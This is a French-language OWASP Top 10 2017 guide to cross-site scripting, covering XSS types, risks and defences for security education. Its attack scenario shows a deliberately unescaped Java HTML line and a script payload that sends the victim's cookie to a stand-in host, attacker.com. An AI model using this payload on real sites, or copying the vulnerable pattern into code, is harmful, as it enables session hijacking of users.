# A7:2017 Cross-Site Scripting (XSS)

| Facteurs de Menace/Vecteurs d'Attaque | Vulnérabilités           | Impacts               |
| -- | -- | -- |
| Accès Lvl : Exploitation 3 | Fréquence 3 : Détection 3 | Techniques 2 : Métier ?  |
| Des outils automatisés permettent de détecter et d'exploiter les trois types de XSS et des frameworks d'exploitation gratuits sont disponibles. | XSS est le deuxième problème le plus fréquent de l'OWASP Top 10 et on le retrouve dans près de 2/3 des applications. Les outils automatisés peuvent trouver automatiquement quelques failles XSS, en particulier dans des technologies matures telles que PHP, JEE / JSP, et ASP.NET. | L'impact de XSS est modéré pour les "XSS basés sur DOM" et les "XSS Réfléchis", et grave pour les "XSS Stockés", avec des exécutions à distance dans le navigateur de la victime, comme du vol de comptes d'accès, de sessions, ou de la distribution de logiciel malveillant à la victime. |

## Suis-je Vulnérable ?

Il y a trois types de XSS, ciblant habituellement les navigateurs des victimes :

* **XSS Réfléchi** : L'application ou l'API copie les entrées utilisateurs, sans validation ni contrôle des caractères spéciaux, comme partie intégrante de la sortie HTML. Une attaque réussie permet à l'attaquant d'exécuter du HTML et/ou du JavaScript arbitraire dans le navigateur de la victime. Typiquement, l'utilisateur devra interagir avec un lien malicieux redirigeant vers une page contrôlée par l'attaquant, comme un site web malicieux de type "point d'eau", publicitaire, ou équivalent.
* **XSS Stocké** : L'application ou l'API stocke des entrées utilisateurs, ni contrôlées ni assainies, qui seront vues ultérieurement par un autre utilisateur ou un administrateur. Ces XSS stockés sont souvent considérés comme un risque élevé, voir critique.
* **XSS basé sur DOM** : Les environnements Javascript, les applications monopage, et les API qui intègrent dynamiquement à la page, des données contrôlables par l'attaquant, sont vulnérables au XSS basé sur DOM. En règle générale, l'application ne doit pas transmettre de données contrôlables par l'attaquant à des API Javascript non sûres.

Les attaques habituelles de type XSS sont le vol de session, la prise de contrôle de compte, le contournement MFA, le remplacement ou le défacement de noeud DOM (comme des fenêtres de connexion-cheval de troie), des attaques du navigateur de l'utilisateur tels que des téléchargements de maliciels, des enregistreurs de frappe et autres attaques du client.

## Comment s'en Prémunir ?

Se protéger des attaques XSS nécessite la séparation des données non sûres du contenu actif du navigateur. 
Pour cela :

* Utiliser des frameworks avec des techniques automatiques d'échappements XSS par conception, comme les dernières versions de Ruby on Rails et React JS. Regarder les limitations de protection XSS de votre framework et prendre les mesures appropriées pour couvrir les cas non gérés.
* Appliquer des techniques d'échappement aux données des requêtes HTTP non sûres, selon le contexte des sorties HTML dans lequel elles seront insérées (body, attribute, Javascript, CSS, ou URL). Cela résoudra les vulnérabilités des XSS Réfléchis ou Stockés. L'[Aide-mémoire de l'OWASP 'Prévention des XSS'](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) donne des détails sur les techniques requises d'échappement des données.
* Appliquer un encodage adapté au contexte lors des modifications des documents du navigateur du client est une protection contre les XSS basés sur DOM. Quand cela ne peut pas être évité, des techniques d'échappement, adaptées au contexte, peuvent être appliquées aux API du navigateur comme indiqué dans l'[Aide-mémoire de l'OWASP 'Prévention des XSS basés sur DOM'](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).
* Etablir une [Politique de Sécurité du Contenu (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) comme mesure de défense en profondeur limitant les attaques XSS. Cela sera efficace, s'il n'y a pas d'autre vulnérabilité qui permettrait de déposer du code malicieux par insertion de fichier en local (ex : écrasement par attaque de type "traversée de répertoire" ou via des bibliothèques vulnérables des réseaux de diffusion de contenu (CDN) autorisés).

## Exemple de Scénario d'Attaque

**Scénario #1** : L'application utilise des données non sûres dans la construction du fragment de code HTML sans validation ni technique d'échappement :

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`

L'attaquant remplace le paramètre ‘CC’ du navigateur par :
`'><script>document.location='https://attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

Cette attaque envoie l'ID de session de la victime vers le site web de l'attaquant, lui permettant ainsi de détourner la session active de l'utilisateur.

**Note** : Les attaquants peuvent utiliser XSS pour invalider les défenses automatisées anti-falsification de requête intersite (CSRF) que l'application peut avoir mises en place.

## Références

### OWASP

* [OWASP Contrôles Proactifs : Encoder les Données](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
* [OWASP Contrôles Proactifs : Valider les Données](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
* [OWASP Standard de Vérification de la Sécurité des Applications : V5](https://owasp.org/www-project-application-security-verification-standard/)
* [OWASP Guide de Test : Test des XSS Réfléchis](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
* [OWASP Guide de Test : Test des XSS Stockés](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)
* [OWASP Guide de Test : Test des XSS basés sur DOM](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)
* [OWASP Aide-Mémoire : Prévention du XSS ](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
* [OWASP Aide-Mémoire : Prévention du XSS basé sur DOM](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
* [OWASP Aide-Mémoire : Contournements de Filtres XSS ](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
* [OWASP Projet Java Encodeur](https://owasp.org/www-project-java-encoder/)

### Externes

* [CWE-79 : Neutralisation incorrecte des entrées utilisateurs](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger : Modèle d'injection côté Client](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
